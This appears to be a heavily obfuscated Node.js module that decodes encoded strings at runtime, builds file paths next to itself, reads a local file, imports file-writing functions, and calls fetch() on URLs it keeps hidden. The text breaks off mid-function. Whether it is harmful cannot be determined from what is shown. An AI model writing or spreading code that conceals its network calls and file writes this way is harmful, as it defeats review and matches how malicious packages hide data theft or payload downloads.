import { existsSync as にし, writeFileSync as あく } from "fs";
import はよ from "node:fs/promises";
import { fileURLToPath as つと, pathToFileURL as をて } from "url";
import しほ from "path";
var にく, ちこ, くに, とに, へけ, れた, ほち, たつ, よえ;
const ふく = [
  "length",
  0x1,
  0x2,
  0x0,
  0x8,
  "c",
  0x3,
  0xd,
  0x7,
  0xc,
  "f",
  0x4,
  0xff,
  "b",
  "d",
  "a",
  "e",
  "undefined",
  void 0x0,
  0xf,
  0xd0,
  0x50,
  0x3f,
  0x6,
  "fromCodePoint",
  "push",
  0x2a,
  0x54,
  0x8e,
  0x55,
  "i",
  "g",
  0x5b,
  0x5,
  0xe7,
  0x1fff,
  0x58,
  0xe,
  !0x1,
  0x81,
  0x30,
  0xa1,
  0x26,
  0xf0,
  0x9,
  0x29,
  0x7b,
  null,
  0x3a,
  0xea,
  0xd7,
  "ok",
  0x44,
  0x22,
  0x80,
  0xeb,
  "h",
  0xce,
  0x6b,
  0xdf,
  0xb3,
  0xba,
  0xca,
  0x7f,
  0x7d,
  0x31,
  0x3b,
  0xa6,
  0x5f,
  0xc6,
  0xef,
  0x21,
  0xae,
  0xc9,
  0xf1,
  0xa7,
  ")",
  0x6d,
  0x77,
  0xa2,
  0x2f,
  0x10,
  0x6e,
  0xb7,
  0xe6,
  0x12,
  0x84,
  0xc8,
  0xdc,
];
すけ(きつ(らに), きつ(れを), きつ(つす));
function きつ(にし, あく = ふく[0x1]) {
  Object.defineProperty(にし, ふく[0x0], {
    value: あく,
    configurable: ふく[0x26],
  });
  return にし;
}
function つす(...にし) {
  すけ(
    (にし[ふく[0x0]] = ふく[0x1]),
    (にし[-ふく[0x6]] =
      'NvDnB_yi=LKW}mU)f%PJGu?7,$/s5H*@AYV]wlSdOo4I2tE|{+k>CFQjc<`hM(xz~qT#9[&a!0Z"8p^3;bRX:e1g.6r'),
    (にし[ふく[0x2]] = "" + (にし[ふく[0x3]] || "")),
    (にし[ふく[0x5]] = にし[ふく[0x2]].length),
    (にし[ふく[0xb]] = []),
    (にし[ふく[0x9]] = ふく[0x3]),
    (にし[ふく[0xa]] = ふく[0x3]),
    (にし[ふく[0x8]] = -ふく[0x1]),
  );
  for (
    にし[ふく[0x4]] = ふく[0x3];
    にし[ふく[0x4]] < にし[ふく[0x5]];
    にし[ふく[0x4]]++
  ) {
    にし[ふく[0x7]] = にし[-ふく[0x6]].indexOf(
      にし[ふく[0x2]][にし[ふく[0x4]]],
    );
    if (にし[ふく[0x7]] === -ふく[0x1]) continue;
    if (にし[ふく[0x8]] < ふく[0x3]) {
      にし[ふく[0x8]] = にし[ふく[0x7]];
    } else {
      すけ(
        (にし[ふく[0x8]] += にし[ふく[0x7]] * ふく[0x20]),
        (にし[ふく[0x9]] |= にし[ふく[0x8]] << にし[ふく[0xa]]),
        (にし[ふく[0xa]] +=
          (にし[ふく[0x8]] & ふく[0x23]) > ふく[0x24] ? ふく[0x7] : ふく[0x25]),
      );
      do {
        すけ(
          にし[ふく[0xb]].push(にし[ふく[0x9]] & ふく[0xc]),
          (にし[ふく[0x9]] >>= ふく[0x4]),
          (にし[ふく[0xa]] -= ふく[0x4]),
        );
      } while (にし[ふく[0xa]] > ふく[0x8]);
      にし[ふく[0x8]] = -ふく[0x1];
    }
  }
  if (にし[ふく[0x8]] > -ふく[0x1]) {
    にし[ふく[0xb]].push(
      (にし[ふく[0x9]] | (にし[ふく[0x8]] << にし[ふく[0xa]])) & ふく[0xc],
    );
  }
  return らに(にし[ふく[0xb]]);
}
function れを(...にし) {
  にし[ふく[0x0]] = ふく[0x1];
  if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
    return (にく[にし[ふく[0x3]]] = つす(ちこ[にし[ふく[0x3]]]));
  }
  return にく[にし[ふく[0x3]]];
}
すけ(
  (にく = {}),
  (ちこ = [
    "pl1B$h^Ehq&M}|.]Xhn",
    'ZhnZ:kpe"WJ{/+n%DP_ZUj^C"=kU4$4SvPwple$]$Um9@Un*+Gd0E&S,3}',
    "I/@BI&,,eQlu})EJ^tXF}{wPMFDfM)]$W}bQTEpi<`]8aal@KA*C}",
    "pUmj68~Pn}_3V`fd.{JHw^t|cm1&U/H%+t[j/",
    "1yD>(3%FHUc&ch)d,)_@7XhvY}1Acnm",
    "WI&5~`um#J)suf_JD}j8gC<]mh/[[MO@",
    "7<Os]h0[q<yRuwho@}^86^>oDJ",
    "fleajzDwl~hCv",
    "49_@KZtm(WOUkm:s!{dLs<C9xP5KQ+psVO^@N1^y;Fv*@D",
    "ktDp*aU,T}%3dn_Ia%n",
    'UB*8k"eiI=.zr[]PDB8_sX[>0`XA<f!lpUH@r0P`2U/{vM_IO%%*<doi^)2',
    "O}vQGS_JkMVu2ns4iaJph3#<_",
    "{IN*+96iAMK7uffVSyZ=B1Fm2uekq,v,EVvQmjno~<?8c!L",
    '(GekMEHzA}O;[$n,tyBKLwbvyjAV3&s4eUD!}{DPpWS0"U)dA<&B`EKCv)',
    "R&9H#b~E<`Ls|RF]Y)(ZL{5wo%U%S$JGb5@C*aN=5hOx$f)OatZ=/eq<i",
    ")P{+_Z&yi`=yzR#l6dz5t9+J8%Yn:n}dFQ,^m<oe5x%l;n",
    ",H.+u<7v:JY!=sA,waWK",
    "]<NQ4(0>wmF",
    "({V!]]SDLKfG@D7HZWuisOTyAPRELfgVed8_mkEC_",
    '2qqAzFa"*Tqc`[C5jthHX["<)u!EX/g](qwpKxLoVLBf}dQo~Le@f8<v',
    "R$@01[mFmPnRqw0$490AgeSD`%Fu}nU",
    "NQ5Zy3_vD<(PS$>o!4B_[VN",
    "u)eaB{K,oxSC9sa$*Ee@8wtm!G<87D+daW=*]e.E0xt8)h~7Z%{+78``y",
    "sqWHJSY<)u&M2s0P0@>A^ZWv>MGjS$x]d>{LCRd[X<}lGa!SxLzL^b7|#}<+v",
    "(h1@Ah9,#LKK}s67CGQBn{0>EWEx|R:s+}U8}",
    '5IiYl(zo4hh;j)K/"U$sJ',
    "{a^0S0I<v<3zP(*wu/sA=M)$nQ8+?b]@ZN",
    '"tSB$C=*X<z+r+n*+}jBab@H}%}"]`q,DZ)L.Y|o{<GmWR}',
    "xxlCTFY|$G|uQ(v@]M[Z4QjowQ$>]S[$Snd0l|CPB",
    "n/@5DE^`/xtB>Uzlet~>v!z>xPlCe,0dx7BHH",
    'IV$y]]S,c`%"sD75o7,y$^&PbMR&ZST%S}8_I(N',
    "65*8mb+mrq.&8!7H+GhH}{V;bzo]o{iPyv",
    "/aj+{RR}Rz>0{fySQtD",
    'T>YyD!x}a~w8x&GOOn#=1exEnJM+Cn!@WAK!E&C`KjZ&Gae](%P")bCP2F!=v',
    'N<7C&M"ibL`B)/@*2GALHe2PqLWq|D4$*E9kv1t]!Gv|.nV@x{q>7Cgv',
    '3qDH,Sa>?md3~Bnwgh>paZ,=1mvf?l_lT52HolOCamQ&rD=/`{$"P[!1/Gw[N',
    "]/_kv1hoxhGRe{=J^qDA>d%m9m,>{n^ssMxiXYBP/UFTa&aSpt3QpZN",
    '9>%yy{!ZfT~5}h"d',
    "J>#A2R2*A)c;JS/4/IcyPX&`M%S%Yfx7KA`>6<D4n",
    "FL.0fa|z}xQ+iR=PTlnp6YT1|ubb8)O@T0~yc&mvz=s[SRh%sq,0:[Fvrq}*v",
    "[LmijdXve~53,fN%^>?L|RK&B",
    "I91+v3;`S`$%dDx7|Q:aS(7|lJthCnsHBTEi*aN",
    "E%WA1t>];Pyywn",
    '%ySB7e5C"=G[b!~7$IEC&b;ZtFZZ$w;sY{?j8XxD',
    "eGE8bX@HQ~uGHf]$;U:ZRxB*(hk;0{}JPzMHEl4D",
    '@M9a+"1E;)7G%f}$(ayY:t|J=GN")|BIf)vyR^{EZG*mhU0S',
    "M@j+K[r}=mD(%w[$ctv",
    "S%@C@e]|V)1)R[O@NTLs%bA~^PWnGh#%Tn3L",
    "La7*1k}D",
    "D+X/$C;}fuO5a/rHaqc+[3l])TeZ=n9@OZ@5,8nmn",
    "l><>O+6iz)733Xl,O/v>aM@JP)7jS(|s",
    "ehK>$^0>Zxb=zUF529iysSo]_K0+Q+(wFN",
    "sEiC,OwPd~LGAXv@}+$^k&6]7mr#vb2/)+mZKk]i=q3=!nWS]lpanx*D*zMWv",
    '[G6y6^l"|u&MvfA4)}Bks',
    "mPd+`pCOZ%+8lmA,}/l@S+vghh.&TmCo.%,L,hbv$`>]vf<7AQfLO0N",
    "`/HKBFM`i~Snb;wSia+A_!]m3}<W(!A7%A$s;whmd~4CBa_$Z9v",
    '"hX_Epb<WGFPv',
    "A>iQ2c=wdm}s)U9,,Q(CW{e3lm$>G))G:{[5ea#[y~KRbMy",
    "!>>F<z0<8UZB+B+/&QnZBV{D",
    "V);ycMK*{<:#;M6o1&=L",
    'XqE0vE>HSm%yqB_*&{6A~:*CpF6<`+G5"t&L#EN',
    "Qami{&^EMUj8O{E/@9|5Wj{1q<1?JkOJD};+3S=~KGy3N",
    "ua^L;<VC#L<cIR}J4>gyuX0H}UOxK_",
    "vIv>J[;yB",
    "f};Q#Z9`GJL!N",
    'fE=>78r,5%n>v{6f)AAL.|I"NM+[<$wP?}a8YhB=[mo0B:>VJOLsyM?D',
    "[0lZ2zZE=G+8g]_$2>#FxEN",
    ":U*BNw#<ZxG!{BhwTymK[woe))7{5asoM@~LsX:OC~s",
    "I}|88jbiHu{h,svwl9A0}kR`V)S",
    "</li60,1s%U!)/Nw^x704Q!ZYz~5XDF]Al)8.a{;cGTcfnlPWv",
    "Zx&0|dR}oUzTgDu5VZqy$8zoxFyQrb@H)>Mp*QpHTMR&p{Z/XnA*f",
    "#{HZm{9,i",
    "L9sKq{}C6`s[TbVPKv",
    "@})LvEYJiKq&@R%G%a1L=xHJ#~ZB3&TPa{=^YOsH4h++K_",
    "{}%>BM*}kz+T7R5*;t~>&jr}%<OnS$1Va{8@aZQCTJ",
    "jy&CCzCERQ90PU<7bU)CJ",
    "[QQjOQ#7CmWfdS}",
    "rrQ</cnN,xv;o}j{wE",
    "9rnc`I}N",
    ",luJJeP",
    "}Tx=vMhwdxJtN.d",
    ":>{L",
    "S/yj|9{*y",
    "4GhAK{6]@=aE`+M]aQt/?alJmxjCfhilO}:F5",
    "YI$Qs",
    "XUMp{9w*xc5`&+h]`Op85",
    "1=sAg8Z,i",
    "zku@W%sMJ/nwo$cdVk^Ya=%WPZZgcs8(sPGn",
    "}hJU}mx7_]5B|G>V",
    "?fzt>=IFA22$r!Twdnzt8",
    "~PTPJ",
    '"E<h',
    "X}fAOQ<P<d",
    "Ycr0.",
    "bf6_F",
    'l<uK%b(e/=B|[!$wS<x@?[oJ8%^+l!eOtO?j9[F"*=',
    "9j5kiz*XXnt|?ZiLCiN=I>8()9P|~",
    "j}B30Jc",
    "r}>Pe1rK",
    "k)O,P",
    '{VN="@*A5rm',
    "mIQ=_",
    "~>LQH",
    "+O#=FR**/G",
    "yl7Qfbf=_JQ",
    "1>,LAafCy~k",
    "k<NLU",
    "]I=L",
    '<y_@?8^CsG4PJSQO[G:F4R"[Mx;&LBg7:q~LY^`,"%>tH(.VU)MpB!=&y~M',
    "~>jr:",
    "9>CpI;N",
    "jGaZ*6%t97gpI[r5^7{Fg30^Pym$wH(,{Y]w|%Dn:aKxD.PU*`l",
    'nRP"W<1zG',
    "j<nwi",
    'HWJ"4m^8EcLX]@tAGc)VL7oG~[,2rn+k)jhrB^#YOXLi!P05)14"H(9e$',
    'a"kTbd9Nxci',
    "i0vTS",
    "%18q*,T",
    'HWJ"4m^8EcLX]@tAGc)VL7oG~[,2rnjgO/;(I%|$f[}q^Z!5Ra^dl%oGo0a7T',
    "Yu~qO%QMW",
    "7CVS,Zt9U4x",
    "x>2S+",
    "a>:F$",
    "gcw_",
    "lItK",
    '"EYC|]W(O:y',
    "y[&CA",
    "]E}lc",
    "{%ma",
    "UbSZ",
    "ubkC",
    "[Oa=Pt4(gp3jT5L!sp}l3.^sw2@,CXzrnFEk|]jfaD",
    "UbT|c",
    "`a<%.P&",
    "fu]tg]&",
    "bcNi#90oH",
    '<y_@?8^CsG4PJSQO[G:F4R"[Mx;&LBR?k<sAlR.,W%xCx<ZSzynAj&qta%zC$fSW',
    "hQ`n",
    "UW!3Kmd:k50",
    "07+3E",
    "_Q?dA",
    "{XBY",
    "~CzV",
    "&C2Z",
    "THYopD!US4+|@3Kij4?d+0JjhE=lZ<$Pc1Q2>_|#Y7",
    "IiLKg!&OH",
    '<y_@?8^CsG4PJSQO[G:F4R"[Mx;&LBeH2}>=Aa4V}x4x4+{G',
    "95R[jk4HC",
    "PzxF4#$C",
    "@|d}$L4at$cecm^.x_SV",
    "DKuUw2zxzt]gJs@WSmXUI",
    "T6w9~",
    "66zFu4$Cn/Qc(K>|x5",
    "tBj0x[whSgGdA",
    "&l{^",
  ]),
);
function かな(...にし) {
  すけ(
    (にし[ふく[0x0]] = ふく[0x3]),
    (にし[ふく[0xf]] = [
      function () {
        return globalThis;
      },
      function () {
        return global;
      },
      function () {
        return window;
      },
      function () {
        return new Function("return this")();
      },
    ]),
    (にし[ふく[0xd]] = ふく[0x12]),
    (にし[ふく[0x2]] = []),
  );
  try {
    すけ(
      (にし[ふく[0xd]] = Object),
      にし[ふく[0x2]][ふく[0x19]]("".__proto__.constructor.name),
    );
  } catch (あく) {}
  きひ: for (
    にし[ふく[0xe]] = ふく[0x3];
    にし[ふく[0xe]] < にし[ふく[0xf]][ふく[0x0]];
    にし[ふく[0xe]]++
  )
    try {
      にし[ふく[0xd]] = にし[ふく[0xf]][にし[ふく[0xe]]]();
      for (
        にし[ふく[0x10]] = ふく[0x3];
        にし[ふく[0x10]] < にし[ふく[0x2]][ふく[0x0]];
        にし[ふく[0x10]]++
      )
        if (
          typeof にし[ふく[0xd]][にし[ふく[0x2]][にし[ふく[0x10]]]] ===
          ふく[0x11]
        )
          continue きひ;
      return にし[ふく[0xd]];
    } catch (あく) {}
  return にし[ふく[0xd]] || this;
}
すけ(
  (くに = かな() || {}),
  (とに = くに.TextDecoder),
  (へけ = くに.Uint8Array),
  (れた = くに.Buffer),
  (ほち = くに.String || String),
  (たつ = くに.Array || Array),
  (よえ = (function (...にし) {
    すけ(
      (にし[ふく[0x0]] = ふく[0x3]),
      (にし[-ふく[0x1a]] = new たつ(ふく[0x36])),
      (にし[ふく[0x1]] = ほち[ふく[0x18]] || ほち.fromCharCode),
      (にし[-ふく[0x13]] = []),
    );
    return きつ(function (...あく) {
      すけ(
        (あく[ふく[0x0]] = ふく[0x1]),
        (あく[ふく[0xf]] = ふく[0x12]),
        (あく[ふく[0x2]] = ふく[0x12]),
        (あく[-ふく[0x15]] = あく[ふく[0x3]][ふく[0x0]]),
        (にし[-ふく[0x13]][ふく[0x0]] = ふく[0x3]),
      );
      for (
        あく[ふく[0x14]] = ふく[0x3];
        あく[ふく[0x14]] < あく[-ふく[0x15]];
      ) {
        すけ(
          (あく[ふく[0x2]] = あく[ふく[0x3]][あく[ふく[0x14]]++]),
          あく[ふく[0x2]] <= ふく[0x3f]
            ? (あく[ふく[0xf]] = あく[ふく[0x2]])
            : あく[ふく[0x2]] <= ふく[0x3b]
              ? (あく[ふく[0xf]] =
                  ((あく[ふく[0x2]] & 0x1f) << ふく[0x17]) |
                  (あく[ふく[0x3]][あく[ふく[0x14]]++] & ふく[0x16]))
              : あく[ふく[0x2]] <= ふく[0x46]
                ? (あく[ふく[0xf]] =
                    ((あく[ふく[0x2]] & ふく[0x13]) << ふく[0x9]) |
                    ((あく[ふく[0x3]][あく[ふく[0x14]]++] & ふく[0x16]) <<
                      ふく[0x17]) |
                    (あく[ふく[0x3]][あく[ふく[0x14]]++] & ふく[0x16]))
                : ほち[ふく[0x18]]
                  ? (あく[ふく[0xf]] =
                      ((あく[ふく[0x2]] & ふく[0x8]) << ふく[0x55]) |
                      ((あく[ふく[0x3]][あく[ふく[0x14]]++] & ふく[0x16]) <<
                        ふく[0x9]) |
                      ((あく[ふく[0x3]][あく[ふく[0x14]]++] & ふく[0x16]) <<
                        ふく[0x17]) |
                      (あく[ふく[0x3]][あく[ふく[0x14]]++] & ふく[0x16]))
                  : ((あく[ふく[0xf]] = ふく[0x16]),
                    (あく[ふく[0x14]] += ふく[0x6])),
          にし[-ふく[0x13]][ふく[0x19]](
            にし[-ふく[0x1a]][あく[ふく[0xf]]] ||
              (にし[-ふく[0x1a]][あく[ふく[0xf]]] = にし[ふく[0x1]](
                あく[ふく[0xf]],
              )),
          ),
        );
      }
      return にし[-ふく[0x13]].join("");
    });
  })()),
);
function らに(...にし) {
  にし[ふく[0x0]] = ふく[0x1];
  return typeof とに !== ふく[0x11] && とに
    ? new とに().decode(new へけ(にし[ふく[0x3]]))
    : typeof れた !== ふく[0x11] && れた
      ? れた.from(にし[ふく[0x3]]).toString("utf-8")
      : よえ(にし[ふく[0x3]]);
}
function ねに(にし, あく = ふく[0x1]) {
  すけ(きつ(つと), きつ(はよ));
  function はよ(...にし) {
    すけ(
      (にし[ふく[0x0]] = ふく[0x1]),
      (にし[ふく[0x1d]] =
        'PENul[s(>R,vdVyr1piBnO"9U_}^ADw<JLG6hF3k{$0T]5Q2t:4Sq#=~%X@/?.K8&x*z;)+e!|MfHc`7ZIagmCjobWY'),
      (にし[ふく[0x1b]] = "" + (にし[ふく[0x3]] || "")),
      (にし[ふく[0x5]] = にし[ふく[0x1b]].length),
      (にし[ふく[0xe]] = []),
      (にし[ふく[0x21]] = ふく[0x3]),
      (にし[-ふく[0x22]] = ふく[0x3]),
      (にし[ふく[0x1f]] = -ふく[0x1]),
    );
    for (
      にし[-ふく[0x1c]] = ふく[0x3];
      にし[-ふく[0x1c]] < にし[ふく[0x5]];
      にし[-ふく[0x1c]]++
    ) {
      にし[ふく[0x1e]] = にし[ふく[0x1d]].indexOf(
        にし[ふく[0x1b]][にし[-ふく[0x1c]]],
      );
      if (にし[ふく[0x1e]] === -ふく[0x1]) continue;
      if (にし[ふく[0x1f]] < ふく[0x3]) {
        にし[ふく[0x1f]] = にし[ふく[0x1e]];
      } else {
        すけ(
          (にし[ふく[0x1f]] += にし[ふく[0x1e]] * ふく[0x20]),
          (にし[ふく[0x21]] |= にし[ふく[0x1f]] << にし[-ふく[0x22]]),
          (にし[-ふく[0x22]] +=
            (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
              ? ふく[0x7]
              : ふく[0x25]),
        );
        do {
          すけ(
            にし[ふく[0xe]].push(にし[ふく[0x21]] & ふく[0xc]),
            (にし[ふく[0x21]] >>= ふく[0x4]),
            (にし[-ふく[0x22]] -= ふく[0x4]),
          );
        } while (にし[-ふく[0x22]] > ふく[0x8]);
        にし[ふく[0x1f]] = -ふく[0x1];
      }
    }
    if (にし[ふく[0x1f]] > -ふく[0x1]) {
      にし[ふく[0xe]].push(
        (にし[ふく[0x21]] | (にし[ふく[0x1f]] << にし[-ふく[0x22]])) &
          ふく[0xc],
      );
    }
    return らに(にし[ふく[0xe]]);
  }
  function つと(...にし) {
    にし[ふく[0x0]] = ふく[0x1];
    if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
      return (にく[にし[ふく[0x3]]] = はよ(ちこ[にし[ふく[0x3]]]));
    }
    return にく[にし[ふく[0x3]]];
  }
  Object[つと(0x4d)](にし, つと(0x4e), {
    [つと(0x4f)]: あく,
    [つと(ふく[0x15])]: ふく[0x26],
  });
  return にし;
}
const ふに = つと(import.meta[れを(0x51)]),
  はた = しほ[れを(0x52)](ふに),
  るる = れを(0x53),
  しく = しほ[れを(ふく[0x1b])](はた, れを(ふく[0x1d])),
  ほの = しほ[れを(ふく[0x1b])](はた, れを(0x56));
async function こお() {
  try {
    すけ(きつ(あく), きつ(にし));
    function にし(...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0x28]] =
          '6tfHnD2jh&@K{obGLW[9CuaE7c+J_qvYU#3`dzV(R)I.!Ny8|i5<Q/P,~klO1s^BZ]gew="X$Tx>m*rp0%S;FM4}A:?'),
        (にし[ふく[0x27]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x6]] = にし[ふく[0x27]].length),
        (にし[-ふく[0x2b]] = []),
        (にし[ふく[0x10]] = ふく[0x3]),
        (にし[ふく[0x17]] = ふく[0x3]),
        (にし[ふく[0x2a]] = -ふく[0x1]),
      );
      for (
        にし[ふく[0x4]] = ふく[0x3];
        にし[ふく[0x4]] < にし[ふく[0x6]];
        にし[ふく[0x4]]++
      ) {
        にし[ふく[0x29]] = にし[ふく[0x28]].indexOf(
          にし[ふく[0x27]][にし[ふく[0x4]]],
        );
        if (にし[ふく[0x29]] === -ふく[0x1]) continue;
        if (にし[ふく[0x2a]] < ふく[0x3]) {
          にし[ふく[0x2a]] = にし[ふく[0x29]];
        } else {
          すけ(
            (にし[ふく[0x2a]] += にし[ふく[0x29]] * ふく[0x20]),
            (にし[ふく[0x10]] |= にし[ふく[0x2a]] << にし[ふく[0x17]]),
            (にし[ふく[0x17]] +=
              (にし[ふく[0x2a]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[-ふく[0x2b]].push(にし[ふく[0x10]] & ふく[0xc]),
              (にし[ふく[0x10]] >>= ふく[0x4]),
              (にし[ふく[0x17]] -= ふく[0x4]),
            );
          } while (にし[ふく[0x17]] > ふく[0x8]);
          にし[ふく[0x2a]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x2a]] > -ふく[0x1]) {
        にし[-ふく[0x2b]].push(
          (にし[ふく[0x10]] | (にし[ふく[0x2a]] << にし[ふく[0x17]])) &
            ふく[0xc],
        );
      }
      return らに(にし[-ふく[0x2b]]);
    }
    function あく(...あく) {
      あく[ふく[0x0]] = ふく[0x1];
      if (typeof にく[あく[ふく[0x3]]] === ふく[0x11]) {
        return (にく[あく[ふく[0x3]]] = にし(ちこ[あく[ふく[0x3]]]));
      }
      return にく[あく[ふく[0x3]]];
    }
    const はよ = await fetch(あく(0x57) + るる + あく(ふく[0x24]));
    if (!はよ[ふく[0x33]]) {
      すけ(きつ(をて), きつ(つと));
      function つと(...にし) {
        すけ(
          (にし[ふく[0x0]] = ふく[0x1]),
          (にし[ふく[0x1]] =
            '<EFfmJXqPtCsBADTrVIWiGRQz:7#^8>|].%!pn5w}"{c(1xb)`&_4?6g/MUhyLv29a~lK*d=S$;Ykj3+HuZ,eON@o[0'),
          (にし[ふく[0x2]] = "" + (にし[ふく[0x3]] || "")),
          (にし[ふく[0x5]] = にし[ふく[0x2]].length),
          (にし[ふく[0xb]] = []),
          (にし[ふく[0x10]] = ふく[0x3]),
          (にし[ふく[0xa]] = ふく[0x3]),
          (にし[ふく[0x8]] = -ふく[0x1]),
        );
        for (
          にし[ふく[0x29]] = ふく[0x3];
          にし[ふく[0x29]] < にし[ふく[0x5]];
          にし[ふく[0x29]]++
        ) {
          にし[ふく[0x2c]] = にし[ふく[0x1]].indexOf(
            にし[ふく[0x2]][にし[ふく[0x29]]],
          );
          if (にし[ふく[0x2c]] === -ふく[0x1]) continue;
          if (にし[ふく[0x8]] < ふく[0x3]) {
            にし[ふく[0x8]] = にし[ふく[0x2c]];
          } else {
            すけ(
              (にし[ふく[0x8]] += にし[ふく[0x2c]] * ふく[0x20]),
              (にし[ふく[0x10]] |= にし[ふく[0x8]] << にし[ふく[0xa]]),
              (にし[ふく[0xa]] +=
                (にし[ふく[0x8]] & ふく[0x23]) > ふく[0x24]
                  ? ふく[0x7]
                  : ふく[0x25]),
            );
            do {
              すけ(
                にし[ふく[0xb]].push(にし[ふく[0x10]] & ふく[0xc]),
                (にし[ふく[0x10]] >>= ふく[0x4]),
                (にし[ふく[0xa]] -= ふく[0x4]),
              );
            } while (にし[ふく[0xa]] > ふく[0x8]);
            にし[ふく[0x8]] = -ふく[0x1];
          }
        }
        if (にし[ふく[0x8]] > -ふく[0x1]) {
          にし[ふく[0xb]].push(
            (にし[ふく[0x10]] | (にし[ふく[0x8]] << にし[ふく[0xa]])) &
              ふく[0xc],
          );
        }
        return らに(にし[ふく[0xb]]);
      }
      function をて(...にし) {
        にし[ふく[0x0]] = ふく[0x1];
        if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
          return (にく[にし[ふく[0x3]]] = つと(ちこ[にし[ふく[0x3]]]));
        }
        return にく[にし[ふく[0x3]]];
      }
      throw new Error(をて(0x59));
    }
    const しほ = await はよ[あく(0x5a)]();
    return しほ[あく(ふく[0x20])];
  } catch {
    return ふく[0x2f];
  }
}
async function よれ() {
  try {
    すけ(きつ(あく), きつ(にし));
    function にし(...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0xf]] =
          'rBTh:y?RA0$|qe.}5d7=V9KNxw`FZX,_v*~!4nm>MD8+zgOG{QYf3/HUCcLkp^#1W)][oP6usS&<2I%@(";bilJjEat'),
        (にし[ふく[0xd]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x6]] = にし[ふく[0xd]].length),
        (にし[ふく[0xe]] = []),
        (にし[ふく[0x21]] = ふく[0x3]),
        (にし[-ふく[0x2e]] = ふく[0x3]),
        (にし[ふく[0x2d]] = -ふく[0x1]),
      );
      for (
        にし[ふく[0x4]] = ふく[0x3];
        にし[ふく[0x4]] < にし[ふく[0x6]];
        にし[ふく[0x4]]++
      ) {
        にし[ふく[0x2c]] = にし[ふく[0xf]].indexOf(
          にし[ふく[0xd]][にし[ふく[0x4]]],
        );
        if (にし[ふく[0x2c]] === -ふく[0x1]) continue;
        if (にし[ふく[0x2d]] < ふく[0x3]) {
          にし[ふく[0x2d]] = にし[ふく[0x2c]];
        } else {
          すけ(
            (にし[ふく[0x2d]] += にし[ふく[0x2c]] * ふく[0x20]),
            (にし[ふく[0x21]] |= にし[ふく[0x2d]] << にし[-ふく[0x2e]]),
            (にし[-ふく[0x2e]] +=
              (にし[ふく[0x2d]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[ふく[0xe]].push(にし[ふく[0x21]] & ふく[0xc]),
              (にし[ふく[0x21]] >>= ふく[0x4]),
              (にし[-ふく[0x2e]] -= ふく[0x4]),
            );
          } while (にし[-ふく[0x2e]] > ふく[0x8]);
          にし[ふく[0x2d]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x2d]] > -ふく[0x1]) {
        にし[ふく[0xe]].push(
          (にし[ふく[0x21]] | (にし[ふく[0x2d]] << にし[-ふく[0x2e]])) &
            ふく[0xc],
        );
      }
      return らに(にし[ふく[0xe]]);
    }
    function あく(...あく) {
      あく[ふく[0x0]] = ふく[0x1];
      if (typeof にく[あく[ふく[0x3]]] === ふく[0x11]) {
        return (にく[あく[ふく[0x3]]] = にし(ちこ[あく[ふく[0x3]]]));
      }
      return にく[あく[ふく[0x3]]];
    }
    return (await はよ[あく(0x5c)](ほの, あく(0x5d)))[あく(0x5e)]();
  } catch {
    return ふく[0x2f];
  }
}
async function なち(にし, あく) {
  if (!あく) {
    あく = function (...あく) {
      あく[ふく[0x0]] = ふく[0x1];
      if (typeof にく[あく[ふく[0x3]]] === ふく[0x11]) {
        return (にく[あく[ふく[0x3]]] = にし(ちこ[あく[ふく[0x3]]]));
      }
      return にく[あく[ふく[0x3]]];
    };
  }
  if (!にし) {
    にし = function (...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0xf]] =
          'Q~/3?]5}9=,:%(_)*gqpu;vwNMdToPHk"tGLUj^se+Y8lx[DbamVAOy`hIBi1Sn2r7$ER6>@|CX.&zfJ<W0ZcF{!#K4'),
        (にし[ふく[0x2]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x6]] = にし[ふく[0x2]].length),
        (にし[-ふく[0x32]] = []),
        (にし[ふく[0x21]] = ふく[0x3]),
        (にし[ふく[0x17]] = ふく[0x3]),
        (にし[ふく[0x1b]] = -ふく[0x1]),
      );
      for (
        にし[-ふく[0x30]] = ふく[0x3];
        にし[-ふく[0x30]] < にし[ふく[0x6]];
        にし[-ふく[0x30]]++
      ) {
        にし[-ふく[0x31]] = にし[ふく[0xf]].indexOf(
          にし[ふく[0x2]][にし[-ふく[0x30]]],
        );
        if (にし[-ふく[0x31]] === -ふく[0x1]) continue;
        if (にし[ふく[0x1b]] < ふく[0x3]) {
          にし[ふく[0x1b]] = にし[-ふく[0x31]];
        } else {
          すけ(
            (にし[ふく[0x1b]] += にし[-ふく[0x31]] * ふく[0x20]),
            (にし[ふく[0x21]] |= にし[ふく[0x1b]] << にし[ふく[0x17]]),
            (にし[ふく[0x17]] +=
              (にし[ふく[0x1b]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[-ふく[0x32]].push(にし[ふく[0x21]] & ふく[0xc]),
              (にし[ふく[0x21]] >>= ふく[0x4]),
              (にし[ふく[0x17]] -= ふく[0x4]),
            );
          } while (にし[ふく[0x17]] > ふく[0x8]);
          にし[ふく[0x1b]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x1b]] > -ふく[0x1]) {
        にし[-ふく[0x32]].push(
          (にし[ふく[0x21]] | (にし[ふく[0x1b]] << にし[ふく[0x17]])) &
            ふく[0xc],
        );
      }
      return らに(にし[-ふく[0x32]]);
    };
  }
  すけ(きつ(あく), きつ(にし));
  const つと = await fetch(れを(ふく[0x44]) + るる + あく(0x60));
  if (!つと[ふく[0x33]]) {
    すけ(きつ(しほ), きつ(をて));
    function をて(...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0x35]] =
